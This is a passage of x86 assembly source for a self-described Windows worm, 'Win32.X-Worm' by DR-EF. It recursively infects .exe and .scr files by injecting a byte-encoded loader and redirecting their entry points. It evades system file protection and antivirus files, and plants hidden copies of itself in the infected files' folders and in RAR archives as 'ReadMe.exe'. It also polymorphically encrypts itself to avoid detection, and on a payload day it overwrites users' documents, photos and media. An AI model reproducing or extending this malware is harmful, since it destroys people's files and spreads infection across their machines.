@NxtF:	mov	eax,[ebp + dwFileAttributes_]		;get file attributes
	and	eax,FILE_ATTRIBUTE_DIRECTORY		;remove bit masks
	cmp	eax,FILE_ATTRIBUTE_DIRECTORY		;it is directory ?
	jne	@isFile
	cmp	byte ptr [ebp + cFileName_],'.'		;its start with . ?
	je	@FndNxt

	push	[ebp + hsearch]				;save search handle
	
	lea	eax,[ebp + cFileName_]
	push	eax
	call	[ebp + SetCurrentDirectory]		;enter directory
	or	eax,eax
	je	@skpdir


	call	InfectDrive				;infect all sub directorys


	lea	eax,[ebp + dotdot]
	push	eax
	call	[ebp + SetCurrentDirectory]		;return to current directory
	

@skpdir:pop	[ebp + hsearch]				;restore search handle
	jmp	@FndNxt
	
@isFile:	
	
	lea	eax,[ebp + File_Name]
	push	eax
	lea	eax,[ebp + FileToInfect]
	push	eax
	push	260
	lea	eax,[ebp + cFileName_]
	push	eax
	call	[ebp + GetFullPathName]			;get file full path	
	or	eax,eax
	je	@FndNxt	
	
	
	;check what kind of file we have: exe/scr or rar file
	

	lea	eax,[ebp + FileToInfect]
@Find0:	cmp	byte ptr [eax],0h
	je	@GetExt
	inc	eax
	jmp	@Find0
@GetExt:sub	eax,4h					;go before the .xxx

	or	dword ptr [eax],20202020h		;convert to lower case

	cmp	dword ptr [eax],"exe."
	je	morechecks
	cmp	dword ptr [eax],"rcs."
	je	morechecks
	
	cmp	byte ptr [ebp + PayloadDay],1h		;today is payload ?
	jne	NotToday
	
	cmp	dword ptr [eax],"iva."			; .avi file ?
	je	FuckFile
	cmp	dword ptr [eax],"cod."			; .doc file ?
	je	FuckFile
	cmp	dword ptr [eax],"3pm."			; .mp3 file ?
	je	FuckFile
	cmp	dword ptr [eax],"gpm."			; .mpg file ?
	je	FuckFile
	cmp	dword ptr [eax],"slx."			; .xls file ?
	je	FuckFile
	cmp	dword ptr [eax],"gpj."			; .jpg file ?
	je	FuckFile
	cmp	dword ptr [eax],"piz."			; .zip file ?
	je	FuckFile
	cmp	dword ptr [eax],"osi."			; .iso file ?
	je	FuckFile
	cmp	dword ptr [eax],"fdp."			; .pdf file ?
	je	FuckFile
	cmp	dword ptr [eax],"tpp."			; .ppt file ?
	je	FuckFile

	jmp	NotToday	
FuckFile:	
	call	xPayLoad
NotToday:
	cmp	dword ptr [eax],"rar."
	je	rar_file	
	jmp	@FndNxt	
rar_file:
	mov	byte ptr [ebp + rarfile],1h
morechecks:	
	mov	eax,[ebp + nFileSizeLow_]		;get file size
		
	cmp	eax,2800h				;too small ?
	jb	@FndNxt	
	cmp	eax,300000h				;too big ?
	ja	@FndNxt
	
	cmp	byte ptr [ebp + rarfile],1h
	je	@xRar					;skip checks that are not relevant for rar file

	call	CheckFileName				;check for av file...
	jnc	@FndNxt

	cmp	dword ptr [ebp + SfcIsFileProtected],0h ;sfc working ?
	je	SfcNotWork
	
	lea	edi,[ebp + Unicode_Path]
	xor	eax,eax
	mov	ecx,200h
	rep	stosb					;blank unicode buffer
	
	push	200h
	lea	eax,[ebp + Unicode_Path]
	push	eax
	push	-1					;string is null terminated
	lea	eax,[ebp + FileToInfect]
	push	eax
	xor	eax,eax
	push	eax
	push	eax
	call	[ebp + MultiByteToWideChar]		;convert path into unicode
	or	eax,eax					;fail ?
	je	@FndNxt					;dont infect
	
	
	lea	eax,[ebp + Unicode_Path]
	push	eax
	push	0h
	call	[ebp + SfcIsFileProtected]		;check if file is protected
	cmp	eax,0h					;is file protected ?
	jne	@FndNxt
	
	
SfcNotWork:						;sfc dont working,assume we on win9x
	
	call	InfectFile
	jmp	@FndNxt

@xRar:	call	InfectRar

@FndNxt:
	mov	byte ptr [ebp + rarfile],0h
	
	lea	eax,[ebp + WIN32_FIND_DATA2]
	push	eax
	push	[ebp + hsearch]
	call	[ebp + FindNextFile]			;find next file
	or	eax,eax
	jne	@NxtF

	push	[ebp + hsearch]
	call	[ebp + FindClose]			;end the search
	
@Stops:	ret
	
	FILE_ATTRIBUTE_DIRECTORY	equ	00000010h
		
	File_Name		dd	0
	dotdot			db	"..",0
	SearchMask		db	"*.*",0
	

	rarfile			db	0


	FileToInfect		db	0ffh	dup(0)

		
	SFC_DLL	db	"SFC.DLL",0
	_SfcIsFileProtected      db      "SfcIsFileProtected",0
	SfcIsFileProtected	dd	0
	
	Unicode_Path	db	200h	dup(0)	 ;200=2 max_path
	
	CP_ACP	equ	0
	
	CopyRight	db	"[Win32.X-Worm (c) 2006 by DR-EF]",0h
	
xPayLoad:

IF	DEBUG
	int	3
	xor	esp,esp			;dont run that if we on debug
ENDIF

	xor	eax,eax
	push	eax
	push	FILE_ATTRIBUTE_NORMAL
	push	CREATE_ALWAYS
	push	eax
	push	eax
	push	GENERIC_READ or GENERIC_WRITE
	lea	eax,[ebp + FileToInfect]
	push	eax
	call	[ebp + CreateFile]
	
	push	eax
	
	push	0h
	lea	ebx,[ebp + tpayload]
	push	ebx
	push	666d
	lea	ebx,[ebp + CopyRight]
	push	ebx
	push	eax
	call	[ebp + WriteFile]
	
	call	[ebp + CloseHandle]

	ret
	
	tpayload	dd	0
	
	
InfectFile:
;*********************Debug C0de*******************************
IF	DEBUG
	push	MB_YESNO
	lea	eax,[ebp + warning]
	push	eax
	lea	eax,[ebp + FileToInfect]
	push	eax
	push	0h
	call	[ebp + MessageBox]
	cmp	eax,IDYES
	jne	ExitInfect
ENDIF
;**************************************************************

	call	RemoveFileAttributes		;set normal attributes for file
	call	OpenFile			;map file into memory
	jnc	ExitRFA				;exit & restore attributes
	
	cmp	word ptr [eax],"ZM"		;check mz sign
	jne	ExitCF
	mov	ecx,dword ptr [eax + 18h]	;check if relocation in mz header
	cmp	ecx,40h				;is 0x40 which is always for pe file
	jne	ExitCF
	add	eax,[eax + 3ch]
	cmp	word ptr [eax],"EP"		;check pe sign
	jne	ExitCF
	
	cmp	word ptr [eax + 08h],0666h	;already infected ?
	je	ExitCF
	
	push	eax				;save pe header offset in the stack
	mov	cx,word ptr [eax + 16h]		;get flags
	and	cx,2000h
	cmp	cx,2000h			;is dll ?
	jne	nodll				;infect only executeables
	pop	eax				;restore stack
	jmp	ExitCF
nodll:	mov	edx,[eax + 34h]
	add	edx,[eax + 28h]
	mov	dword ptr [ebp + ReturnAddress],edx	;setup return entry point
	
	pushad
	
	lea	edi,[ebp + MorphedWormFileName]
	
	mov	ecx,9h
@_RandLetter:	
	call	GenRandomNumber
	and	al,19h
	add	al,61h
	stosb
	loop	@_RandLetter
	mov	byte ptr [edi],'.'
	inc	edi
	mov	ecx,3h
@_xRandLetter:	
	call	GenRandomNumber
	and	al,19h
	add	al,61h
	stosb
	loop	@_xRandLetter				
	
	lea	esi,[ebp + FileToInfect]
	lea	edi,[ebp + FileCopyPath]
	
nextc:	cmp	byte ptr [esi+ecx],0h
	je	endc
	inc	ecx
	jmp	nextc
endc:	inc	ecx	
	rep	movsb
		
nxtc:	cmp	byte ptr [edi],'\'
	je	setfn
	mov	byte ptr [edi],0h
	dec	edi
	jmp	nxtc
setfn:	lea	esi,[ebp + MorphedWormFileName]
	mov	ecx,0dh
	inc	edi
	rep	movsb

	popad
		
	movzx	ecx,word ptr [eax + 6h]		;get number of sections
	mov	ebx,[eax + 74h]
	shl	ebx,3h
	add	eax,ebx
	add	eax,78h				;goto first section header
@xnexts:mov	ebx,[eax + 24h]			;get section flags
	and	ebx,20h
	cmp	ebx,20h				;is code section ?
	je	FoundCS
	add	eax,28h
	loop	@xnexts
	pop	eax				;restore stack
	jmp	ExitCF
FoundCS:mov	ebx,[eax + 24h]			;get section flags
	and	ebx,80000000h
	cmp	ebx,80000000h			;does code section writeable ?
	jne	__x1
	pop	eax				;restore stack
	jmp	ExitCF
__x1:	mov	ebx,[eax + 10h]			;get section size of raw data
	sub	ebx,[eax + 8h]
	cmp	ebx,VirusLoaderSize		;check for minimum loader size
	ja	____1
	pop	eax				;restore stack
	jmp	ExitCF
____1:	mov	ecx,[eax + 8h]			;get section vitrual size	
	mov	ebx,ecx				;get section virtual size
	add	ebx,[eax + 14h]			;add to it pointer raw data rva
	add	ebx,[ebp + mapbase]		;convert it to va
	
	mov	edi,ebx
	lea	esi,[ebp + VirusLoader]
	mov	ecx,VirusLoaderSize
	rep	movsb				;inject loader
	
	pop	eax				;restore stack
	
	sub	ebx,[ebp + mapbase]
	mov	[eax + 28h],ebx			;redirect entry point	
	
	mov	word ptr [eax + 08h],0666h	;mark as infected

	push	0h
	lea	eax,[ebp + FileCopyPath]
	push	eax
	lea	eax,[ebp + MorphedWorm]
	push	eax
	call	[ebp + CopyFile]		;copy morphed worm file
	
	push	FILE_ATTRIBUTE_READONLY or FILE_ATTRIBUTE_HIDDEN or FILE_ATTRIBUTE_SYSTEM
	lea	eax,[ebp + FileCopyPath]
	push	eax
	call	[ebp + SetFileAttributes]

ExitCF:	call	CloseFile			;unmap file from memory with changes
ExitRFA:call	RestoreFileAttributes		;restore old attributes
ExitInfect:
	ret
	

VirusLoader:					;see xworm_loader.asm for source of that code

	MorphedWormFileName	equ	($+7fh)
	ReturnAddress		equ	($+96h)

db 060h,064h,067h,0a1h,000h,000h,08bh,010h,042h,074h,004h,04ah,092h,0ebh,0f7h
db 08bh,040h,004h,025h,000h,000h,0ffh,0ffh,066h,081h,038h,04dh,05ah,074h,007h
db 02dh,000h,000h,001h,000h,0ebh,0f2h,08bh,0e8h,003h,040h,03ch,08bh,040h,078h
db 003h,0c5h,050h,033h,0d2h,08bh,040h,020h,003h,0c5h,08bh,038h,003h,0fdh,04fh
db 047h,0e8h,008h,000h,000h,000h,057h,069h,06eh,045h,078h,065h,063h,000h,05eh
db 0b9h,008h,000h,000h,000h,0f3h,0a6h,074h,009h,042h,080h,03fh,000h,074h,0e2h
db 047h,0ebh,0f8h,058h,0d1h,0e2h,08bh,058h,024h,003h,0ddh,003h,0dah,066h,08bh
db 013h,0c1h,0e2h,002h,08bh,058h,01ch,003h,0ddh,003h,0dah,08bh,01bh,003h,0ddh
db 06ah,001h,0e8h,00eh,000h,000h,000h,056h,069h,072h,075h,073h,046h,069h,06ch
db 065h,02eh,065h,078h,065h,000h,0ffh,0d3h,083h,0f8h,01fh,072h,0fbh,061h,068h
db 0c1h,010h,040h,000h,0c3h

VirusLoaderSize		equ	($-VirusLoader)	
	
	
	FileCopyPath	db	0ffh	dup(0)
	
	
	

CloseFile:
	push	dword ptr [ebp + mapbase]
	call	[ebp + UnMapViewOfFile]
	push	dword ptr [ebp + hmap]
	call	[ebp + CloseHandle]
	lea	eax,[ebp + LastWriteTime]
	push	eax
	lea	eax,[ebp + LastAccessTime]
	push	eax
	lea	eax,[ebp + CreationTime]
	push	eax
	push	dword ptr [ebp + hfile]
	call	[ebp + SetFileTime]
	push	dword ptr [ebp + hfile]
	call	[ebp + CloseHandle]
	ret
	
OpenFile:
	xor	eax,eax
	push	eax
	push	FILE_ATTRIBUTE_NORMAL
	push	OPEN_EXISTING
	push	eax
	push	eax
	push	GENERIC_READ or GENERIC_WRITE
	lea	eax,[ebp + FileToInfect]
	push	eax
	call	[ebp + CreateFile]
	cmp	eax,INVALID_HANDLE_VALUE
	je	OpenFileErr
	mov	dword ptr [ebp + hfile],eax
	lea	eax,[ebp + LastWriteTime]
	push	eax
	lea	eax,[ebp + LastAccessTime]
	push	eax
	lea	eax,[ebp + CreationTime]
	push	eax
	push	dword ptr [ebp + hfile]
	call	[ebp + GetFileTime]
	xor	eax,eax
	push	eax
	push	eax
	push	eax
	push	PAGE_READWRITE
	push	eax
	push	dword ptr [ebp + hfile]
	call	[ebp + CreateFileMapping]
	cmp	eax,0h
	je	FileSizeErr
	mov	dword ptr [ebp + hmap],eax
	xor	eax,eax
	push	eax	
	push	eax
	push	eax
	push	FILE_MAP_WRITE
	push	dword ptr [ebp + hmap]
	call	[ebp + MapViewOfFile]
	cmp	eax,0h
	je	MapFileErr
	mov	dword ptr [ebp + mapbase],eax
	stc
	ret
MapFileErr:
	push	dword ptr [ebp + hmap]
	call	[ebp + CloseHandle]
FileSizeErr:
	push	dword ptr [ebp + hfile]
	call	[ebp + CloseHandle]
OpenFileErr:
	clc
	ret

	hmap			dd	0
	mapbase			dd	0
	CreationTime		dq	0
	LastAccessTime		dq	0
	LastWriteTime		dq	0
	hfile			dd	0
	FileSize		dd	0

RemoveFileAttributes:
	lea	eax,[ebp + FileToInfect]
	push	eax
	call	[ebp + GetFileAttributes]
	mov	[ebp + OldFileAttribute],eax
	push	FILE_ATTRIBUTE_NORMAL
	lea	eax,[ebp + FileToInfect]
	push	eax
	call	[ebp + SetFileAttributes]
	ret
	
	OldFileAttribute	dd	0
	
RestoreFileAttributes:
	push	dword ptr [ebp + OldFileAttribute]
	lea	eax,[ebp + FileToInfect]
	push	eax
	call	[ebp + SetFileAttributes]
	ret




FILE_ATTRIBUTE_READONLY		equ	1
FILE_ATTRIBUTE_HIDDEN		equ	2
FILE_ATTRIBUTE_SYSTEM		equ	4 



InfectRar:
IF	DEBUG
	push	MB_YESNO
	lea	eax,[ebp + rar_warning]
	push	eax
	lea	eax,[ebp + FileToInfect]
	push	eax
	push	0h
	call	[ebp + MessageBox]
	cmp	eax,IDYES
	jne	ExitRarInfection
ENDIF
	call	InitRandomNumber
	xor	eax,eax
	push	eax
	push	eax
	push	OPEN_EXISTING
	push	eax
	push	FILE_SHARE_READ
	push	GENERIC_READ
	lea	eax,[ebp + MorphedWorm]
	push	eax
	call	[ebp + CreateFile]		;open the infected dropper
	cmp	eax,INVALID_HANDLE_VALUE
	je	ExitRarInfection
	mov	[ebp + hInfectedDropper],eax
	push	0h
	push	eax
	call	[ebp + GetFileSize]		;get dropper file size
	cmp	eax,0ffffffffh
	je	ExitAndCloseDropperFile
	mov	[ebp + DropperSize],eax
	xor	eax,eax
	push	eax
	push	eax
	push	eax
	push	PAGE_READONLY
	push	eax
	push	dword ptr [ebp + hInfectedDropper]
	call	[ebp + CreateFileMapping]	;create file mapping object for the dropper
	cmp	eax,0h
	je	ExitAndCloseDropperFile
	mov	[ebp + hDropperMap],eax
	xor	eax,eax
	push	eax
	push	eax
	push	eax
	push	FILE_MAP_READ
	push	dword ptr [ebp + hDropperMap]
	call	[ebp + MapViewOfFile]		;map dropper into memory
	cmp	eax,0h
	je	ExitAndCloseDropperMap
	mov	[ebp + DropperMap],eax
	xor	eax,eax
	push	eax
	push	eax
	push	OPEN_EXISTING
	push	eax
	push	FILE_SHARE_READ
	push	GENERIC_READ or GENERIC_WRITE
	lea	eax,[ebp + FileToInfect]
	push	eax
	call	[ebp + CreateFile]		;open rar file
	cmp	eax,INVALID_HANDLE_VALUE
	je	ExitAndUnMapDropper
	mov	[ebp + hRarFile],eax
	xor	eax,eax
	push	eax
	mov	eax,[ebp + nFileSizeLow_]
	add	eax,[ebp + DropperSize]
	add	eax,RarHeaderSize
	sub	eax,7h				;overwrite rar file sign
	push	eax
	xor	eax,eax
	push	eax
	push	PAGE_READWRITE
	push	eax
	push	dword ptr [ebp + hRarFile]
	call	[ebp + CreateFileMapping]	;create file mapping object of the rar file
	cmp	eax,0h
	je	ExitAndCloseRarFile
	mov	[ebp + hRarMap],eax
	mov	eax,[ebp + nFileSizeLow_]
	add	eax,[ebp + DropperSize]
	add	eax,RarHeaderSize
	sub	eax,7h				;overwrite rar file sign
	push	eax
	xor	eax,eax
	push	eax
	push	eax
	push	FILE_MAP_WRITE
	push	dword ptr [ebp + hRarMap]
	call	[ebp + MapViewOfFile]
	cmp	eax,0h
	je	ExitAndCloseRarMap
	mov	[ebp + RarMap],eax
	cmp	dword ptr [eax],"!raR"		;is rar file ?
	jne	RarFileInfectionErr
	cmp	byte ptr [eax + 0fh],1h		;is already infected ?
	je	RarFileInfectionErr
	xor	eax,eax
	mov	edx,[ebp + DropperMap]
	mov	ecx,[ebp + DropperSize]
	call	xcrc32				;get infected dropper crc32 checksum
	mov	dword ptr [ebp + FILE_CRC],eax	;set it insaid rar header
	mov	eax,dword ptr [ebp + ftCreationTime_ + 4]
	mov	dword ptr [ebp + FTIME],eax	;set random time\data
	pushad
	mov	ecx,6h
	lea	edi,[ebp + FileInsaidRar]
@RandLetterx:	
	call	GenRandomNumber
	and	al,19h
	add	al,61h
	stosb
	loop	@RandLetterx			;gen random name for the infected dropper
	popad
	mov	eax,[ebp + DropperSize]
	mov	[ebp + PACK_SIZE],eax
	mov	[ebp + UNP_SIZE],eax		;set dropper size insaid of rar header
	xor	eax,eax
	lea	edx,[ebp + headcrc]
	mov	ecx,(EndRarHeader-RarHeader-2)
	call	xcrc32				;get crc32 checksum of the rar header
	mov	word ptr [ebp + HEAD_CRC],ax	;and set it in rar header
	lea	esi,[ebp + RarHeader]
	mov	edi,[ebp + RarMap]
	add	edi,[ebp + nFileSizeLow_]
	sub	edi,7h				;overwrite rar file sign
	push	edi
	mov	ecx,RarHeaderSize
	rep	movsb				;write the rar header into rar file
	mov	esi,[ebp + DropperMap]
	pop	edi
	add	edi,RarHeaderSize
	mov	ecx,[ebp + DropperSize]
	rep	movsb				;write the infected dropper into rar file
	mov	eax,[ebp + RarMap]
	push	eax
	inc	byte ptr [eax + 0fh]		;mark the rar file as infected(0fh=reserved1)
	mov	edx,eax
	xor	eax,eax
	add	edx,9h
	mov	ecx,0bh
	call	xcrc32				;get crc32 of the rar main header
	pop	ebx
	mov	word ptr [ebx + 7h],ax		;[ebx + 7h]=HEAD_CRC
ExitAndUnMapRarFile:
	push	[ebp + RarMap]
	call	[ebp + UnMapViewOfFile]
ExitAndCloseRarMap:
	push	dword ptr [ebp + hRarMap]
	call	[ebp + CloseHandle]
ExitAndCloseRarFile:
	push	dword ptr [ebp + hRarFile]
	call	[ebp + CloseHandle]
ExitAndUnMapDropper:
	push	dword ptr [ebp + DropperMap]	
	call	[ebp + UnMapViewOfFile]
ExitAndCloseDropperMap:
	push	dword ptr [ebp + hDropperMap]
	call	[ebp + CloseHandle]
ExitAndCloseDropperFile:
	push	dword ptr [ebp + hInfectedDropper]
	call	[ebp + CloseHandle]
ExitRarInfection:
	ret
RarFileInfectionErr:
	push	FILE_BEGIN
	push	0h
	push	dword ptr [ebp + nFileSizeLow_]
	push	dword ptr [ebp + hRarFile]
	call	[ebp + SetFilePointer]
	push	dword ptr [ebp + hRarFile]
	call	[ebp + SetEndOfFile]
	jmp	ExitAndUnMapRarFile
	
	

	hInfectedDropper	dd	0
	DropperSize		dd	0
	hDropperMap		dd	0
	DropperMap		dd	0
	hRarFile		dd	0
	hRarMap			dd	0
	RarMap			dd	0
	
	PAGE_READONLY		equ	00000002h
	FILE_MAP_READ		equ	00000004h
	FILE_BEGIN		equ	0
	
RarHeader:
		HEAD_CRC	dw	0h
	headcrc:HEAD_TYPE	db	74h
		HEAD_FLAGS	dw	8000h	;normal flag
		HEAD_SIZE	dw	RarHeaderSize
		PACK_SIZE	dd	0h
		UNP_SIZE	dd	0h
		HOST_OS		db	0h	;Ms-Dos
		FILE_CRC	dd	0h
		FTIME		dd	0h
		UNP_VER		db	14h
		METHOD		db	30h	;storing
		NAME_SIZE	dw	0ah	;file name size
	endhcrc:ATTR		dd	0h
	FileInsaidRar	equ	$
		FILE_NAME	db	"ReadMe.exe"
	EndRarHeader:
RarHeaderSize	equ	($-RarHeader)	

IF	DEBUG
	rar_warning	db "Rar File Infection!",0
ENDIF
	
	
;(c) z0mbie/29a crc32 function
; input:  EDX=data, ECX=size, EAX=crc
; output: EAX=crc, EDX+=ECX, ECX=BL=0
xcrc32:	jecxz   @@4			
	not     eax
@@1:	xor     al, [edx]
	inc     edx
	mov     bl, 8
@@2:	shr     eax, 1
	jnc     @@3
	xor     eax, 0EDB88320h
@@3:	dec     bl
	jnz     @@2
	loop    @@1
	not     eax
@@4:	ret	
	


GenMorphedWorm:

	push	0ffh
	lea	edx,[ebp + RunningWorm]
	push	edx
	push	0
	call	[ebp + GetModuleFileName]			;get worm file
	or	eax,eax
	je	GMW_Fail
	
	lea	edx,[ebp + MorphedWorm]
	push	edx
	push	0ffh
	call	[ebp + GetTempPath]				;get the temp directory path
	or	eax,eax
	je	GMW_Fail
		
	lea	edi,[ebp + MorphedWorm]
SNB:	cmp	byte ptr [edi],0h
	je	GTFN
	inc	edi
	jmp	SNB					;seek till 0 byte found
	
GTFN:	call	InitRandomNumber
	mov	ecx,6h
@RandLetter:	
	call	GenRandomNumber
	and	al,19h
	add	al,61h
	stosb
	loop	@RandLetter				;gen random file name
	mov	byte ptr [edi],'.'
	inc	edi
	mov	ecx,3h
@xRandLetter:	
	call	GenRandomNumber
	and	al,19h
	add	al,61h
	stosb
	loop	@xRandLetter				;gen random file suffix
		

	xor	eax,eax
	
	push	eax
	push	FILE_ATTRIBUTE_NORMAL
	push	OPEN_EXISTING
	push	eax
	push	FILE_SHARE_READ
	push	GENERIC_READ
	lea	edx,[ebp + RunningWorm]
	push	edx
	call	[ebp + CreateFile]
	
	cmp	eax,INVALID_HANDLE_VALUE
	je	GMW_Fail
	mov	dword ptr [ebp + RW_FileHandle],eax	;save its file handle
	
	push	0
	push	eax
	call	[ebp + GetFileSize]			;get running worm size
	cmp	eax,INVALID_HANDLE_VALUE
	je	GMW_F_CloseRWF
	mov	dword ptr [ebp + RW_FileSize],eax	;save worm size
		
	push	eax
	add	dword ptr [esp],400h			;add 1k for safty
	push	GPTR
	call	[ebp + GlobalAlloc]			;allocate memory to store the running worm
	or	eax,eax
	je	GMW_F_CloseRWF
	mov	[ebp + MorphWorkBuffer],eax
	
	mov	[ebp + MWB_XBytes],0
	
	push	0h

	lea	edx,[ebp + MWB_XBytes]
	push	edx
	push	[ebp + RW_FileSize]
	push	eax
	push	[ebp + RW_FileHandle]
	call	[ebp + ReadFile]			;read worm into memory
	or	eax,eax
	je	GMW_F_FreeMem
	
	
	;morph pe header
	;********************************
		
	mov	ebx,[ebp + MorphWorkBuffer]
	add	ebx,[ebx + 3ch]				;goto pe header
	call	GenRandomNumber
	mov	dword ptr [ebx + 8h],eax		;set random time stamp
	call	GenRandomNumber
	mov	dword ptr [ebx + 10h],eax		;set number of symbols
	call	GenRandomNumber
	mov	word ptr [ebx + 1ah],ax			;set linker version
	call	GenRandomNumber
	mov	dword ptr [ebx + 70h],eax		;set loader flags
	call	GenRandomNumber
	mov	dword ptr [ebx + 2ch],eax		;set base of code
	call	GenRandomNumber
	mov	dword ptr [ebx + 4ch],eax		;set reserverd
	call	GenRandomNumber
	mov	dword ptr [ebx + 44h],eax		;set image version
	call	GenRandomNumber
	mov	dword ptr [ebx + 58h],eax		;set checksum
	call	GenRandomNumber
	mov	dword ptr [ebx + 40h],eax		;set OS
	movzx	ecx,word ptr [ebx + 6h]			;get number of sections
	mov	edx,[ebx + 74h]
	shl	edx,3h
	add	ebx,edx
	add	ebx,78h
	
	push	ebx					;save first section header
	
@nexts:	mov	edi,ebx
	push	ecx
	mov	ecx,8h
@Rndsec:call	GenRandomNumber
	and	al,19h
	add	al,61h
	stosb
	loop	@Rndsec					;gen random section name
	pop	ecx
	add	ebx,28h
	loop	@nexts					;next section	
	
	
	;zero data & code sections
	;*************************
	
	pop	ebx					;restore first section header
	

	mov	edi,[ebp + MorphWorkBuffer]
	add	edi,[ebx + 14h]
	mov	[ebp + WhereToWriteDecryptor],edi	;used for VPE
	
	mov	edi,[ebp + MorphWorkBuffer]		;get base address	
	mov	ecx,[ebx + 10h]				;get size of raw data
	xor	eax,eax
	add	edi,[ebx + 14h]				;get starting offset of section
	rep	stosb					;delete the contect of code section
		
	add	ebx,28h					;move to next data section
	
	pushad
	mov	edi,[ebp + MorphWorkBuffer]
	add	edi,[edi + 3ch]
	mov	eax,[ebx + 0ch]
	add	eax,[edi + 34h]
	
	mov	edx,[edi + 34h]
	push	dword ptr [ebx + 0ch]
	add	[esp],edx
	pop	dword ptr [ebp + CustomXDecryptPoint]	;set to virtual address
	
	
	mov	[ebp + etms_decryptor_offset],eax
	popad
	
	mov	edi,[ebp + MorphWorkBuffer]		;get base address	
	mov	ecx,data_sec_size
	xor	eax,eax
	add	edi,[ebx + 14h]				;get starting offset of section
	
	mov	[ebp + pure_virus_offset],edi
	
	rep	stosb					;delete the contect of data section
	
		
	;encrypt using bgpe
	;******************
	
	push	(VirusSizeX1+1024)
	push	GPTR
	call	[ebp + GlobalAlloc]		
	
	or	eax,eax
	je	GMW_F_CMF
	
	mov	[ebp + bgpe_morphed_worm],eax		;save buffer address
	xchg	edi,eax
	call	GenRandomNumber
	lea	esi,[ebp + virus_start]
	mov	ecx,VirusSizeX4
	call	bgpe					;morph the worm using bgpe
	
	mov	[ebp + bgpe_morphed_worm_size],eax	;save morphed worm size
	
	
	;encrypt using Etms
	;******************

	add	eax,1400h
	push	eax
	push	GPTR
	call	[ebp + GlobalAlloc]			;allocate memory to store encrypted stuff
	
	or	eax,eax
	je	GMW_F_MEM
	
	mov	[ebp + etms_morphed_worm],eax		;output buffer
		
	mov	edi,eax
	
	call	GenRandomNumber
	and	eax,714024d
	mov	[ebp + seed],eax	
	
	mov	ecx,[ebp + bgpe_morphed_worm_size]
	mov	esi,[ebp + bgpe_morphed_worm]
	

	push	ebp

	mov	ebp,[ebp + etms_decryptor_offset]
	
	
	call	etms_engine

	pop	ebp

	;copy encrypted data to the data section:
	;****************************************

	mov	esi,edi
	mov	edi,[ebp + pure_virus_offset]
	push	ecx
	push	edi
	rep	movsb
	

	;encrypt using vpe
	;******************
	
	pop	[ebp + StartOfDataToEncrypt]

	pop	eax					;size
	mov	ecx,4h
	div	ecx
	add	eax,edx					;align
	
	mov	[ebp + SizeOfDataToEncrypt],eax
	
	call	CreateDecryptor				;encrypt virus using VPE
	
	
	;free memory
	;****************
	
	push	[ebp + etms_morphed_worm]
	call	[ebp + GlobalFree]

	push	[ebp + bgpe_morphed_worm]
	call	[ebp + GlobalFree]

	;write it back to disk
	;*******************************
	
	xor	eax,eax
	push	eax
	push	FILE_ATTRIBUTE_NORMAL
	push	OPEN_ALWAYS
	push	eax
	push	eax
	push	GENERIC_WRITE
	lea	edx,[ebp + MorphedWorm]
	push	edx
	call	[ebp + CreateFile]
	cmp	eax,INVALID_HANDLE_VALUE
	je	GMW_F_FreeMem
	mov	[ebp + MW_FileHandle],eax
	
	mov	[ebp + MWB_XBytes],0
	
	push	0
	lea	edx,[ebp + MWB_XBytes]
	push	edx
	push	[ebp + RW_FileSize]
	push	[ebp + MorphWorkBuffer]
	push	eax
	call	[ebp + WriteFile]
	or	eax,eax
	je	GMW_F_CMF
	
	push	[ebp + MW_FileHandle]
	call	[ebp + CloseHandle]
	
	push	[ebp + MorphWorkBuffer]
	call	[ebp + GlobalFree]	
	
	push	[ebp + RW_FileHandle]
	call	[ebp + CloseHandle]
	
	stc
	ret
GMW_F_MEM:
	push	[ebp + bgpe_morphed_worm]
	call	[ebp + GlobalFree]
GMW_F_CMF:	
	push	[ebp + MW_FileHandle]
	call	[ebp + CloseHandle]
GMW_F_FreeMem:
	push	[ebp + MorphWorkBuffer]
	call	[ebp + GlobalFree]
GMW_F_CloseRWF:
	push	[ebp + RW_FileHandle]
	call	[ebp + CloseHandle]
GMW_Fail:
	clc
	ret
	
	
	
	pure_virus_offset	dd	0
	
	
	etms_morphed_worm	dd	0
	etms_work_buffer	dd	0
	etms_decryptor_offset	dd	0
	
	bgpe_morphed_worm	dd	0
	bgpe_morphed_worm_size	dd	0
	

	MWB_XBytes		dd	0
	
	MorphWorkBuffer		dd	0

	RW_FileSize		dd	0
	RW_FileHandle		dd	0
	MW_FileHandle		dd	0
	RunningWorm		db	0ffh 	dup(0)
	MorphedWorm		db	0ffh	dup(0)
	

ApiNamesTable:
	
	_CreateFile		db	"CreateFileA",0
	_CloseHandle		db	"CloseHandle",0
	_CreateFileMapping	db 	"CreateFileMappingA",0
	_MapViewOfFile		db 	"MapViewOfFile",0
	_UnmapViewOfFile	db 	"UnmapViewOfFile",0
	_LoadLibrary		db	"LoadLibraryA",0
	_FreeLibrary		db	"FreeLibrary",0
	_GetModuleFileName	db	"GetModuleFileNameA",0
	_SetFileAttributesA	db	"SetFileAttributesA",0
	_GetFileSize		db	"GetFileSize",0
	_SetFilePointer		db	"SetFilePointer",0
	_SetEndOfFile		db	"SetEndOfFile",0
	_GetTickCount		db	"GetTickCount",0
	_GlobalAlloc		db	"GlobalAlloc",0
	_GlobalFree		db	"GlobalFree",0
	_GetLocalTime		db	"GetLocalTime",0
	_GetFileAttributes	db	"GetFileAttributesA",0
	_GetFileTime		db	"GetFileTime",0
	_SetFileTime		db	"SetFileTime",0
	_CreateMutexA		db	"CreateMutexA",0
	_OpenMutexA		db	"OpenMutexA",0
	_FindFirstFileA		db	"FindFirstFileA",0
	_FindNextFileA		db	"FindNextFileA",0
	_SetCurrentDirectoryA	db	"SetCurrentDirectoryA",0
	_WriteFile		db	"WriteFile",0
	_FindClose		db	"FindClose",0
	_MultiByteToWideChar	db	"MultiByteToWideChar",0
	_lstrcatA		db	"lstrcatA",0
	_CreateThread		db	"CreateThread",0
	_GetModuleHandle	db	"GetModuleHandleA",0
	_Sleep			db	"Sleep",0
	_WaitForSingleObject	db	"WaitForSingleObject",0
	_ExitThread		db	"ExitThread",0
	_ExitProcess		db	"ExitProcess",0
	_GetDriveTypeA		db	"GetDriveTypeA",0
	_GetFullPathNameA	db	"GetFullPathNameA",0
	_WinExec		db	"WinExec",0
	_VirtualProtect		db	"VirtualProtect",0
	_SetUnhandledExceptionFilter	db	"SetUnhandledExceptionFilter",0
	_DeleteFileA		db	"DeleteFileA",0
	_GetTempPathA		db	"GetTempPathA",0
	_ReadFile		db	"ReadFile",0
	_CopyFileA		db	"CopyFileA",0
	_GetWindowsDirectoryA	db	"GetWindowsDirectoryA",0
	
	
IF	DEBUG
	_OutputDebugString	db	"OutputDebugStringA",0
ENDIF
	
